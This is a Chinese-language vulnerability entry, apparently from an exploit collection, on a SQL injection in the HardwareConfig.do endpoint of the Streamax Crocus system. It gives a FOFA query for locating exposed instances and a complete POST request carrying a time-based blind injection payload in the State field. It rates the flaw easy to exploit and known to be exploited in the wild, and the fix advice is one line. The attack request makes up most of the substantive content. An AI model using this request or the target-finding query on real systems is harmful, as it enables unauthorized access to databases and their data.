# 锐明技术Crocus系统 HardwareConfig.do  SQL注入漏洞

锐明技术Crocus系统 HardwareConfig.do SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

锐明技术Crocus系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/ThirdResource/respond/respond.min.js" && title="Crocus"

POC/EXP：

```
POST /HardwareConfig.do?Action=ReadTask HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Cookie: Saffron.U=VUlEPTEmVU49MQ==
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

PageIndex=0&PageSize=20&State=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)
```

![image-20260113171501608](assets/image-20260113171501608.png)

```

```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
